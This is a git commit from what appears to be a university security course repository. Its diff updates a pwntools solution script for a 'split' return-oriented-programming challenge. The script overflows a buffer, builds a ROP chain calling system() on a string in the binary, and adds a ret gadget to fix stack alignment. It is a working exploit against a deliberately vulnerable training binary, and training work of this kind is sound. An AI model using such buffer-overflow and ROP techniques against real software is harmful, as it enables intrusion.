3acf8ce425a1681d6bc0ec1f7f4817ce3097a4d0
Augusto Zanellato <augustocesare.zanellato@studenti.unipd.it>
2021-12-13 21:32:27 +0100

    Fix stack alignment issue on first ROP chall
    Thanks to @AlessandroMassarenti for reporting the issue

--- 20211203_ROP/1_split/solution.py
+++ 20211203_ROP/1_split/solution.py
@@ -1,9 +1,23 @@
 from pwn import *
 
+context.terminal = "alacritty", "-e"
 context.binary = "./split"
 e = ELF("./split")
-r = ROP(e)
-p = e.process()
-r.call("system", [e.symbols["usefulString"]])
-p.send(b"A" * 8 * 5 + r.chain())
-log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
+
+
+def exploit(pad: bool = False) -> str:
+    r = ROP(e)
+    p = process()
+    if pad:
+        r.call(r.ret)
+    r.call("system", [e.symbols["usefulString"]])
+    log.info(f"chain:\n{r.dump()}")
+    p.send(b"A" * 8 * 5 + r.chain())
+    return p.recvline_regex(rb".*{.*}.*").decode("ascii")
+
+
+try:
+    log.success(exploit())
+except EOFError:
+    log.failure("Stack alignment is needed, adding a ret to the chain...")
+    log.success(exploit(True))
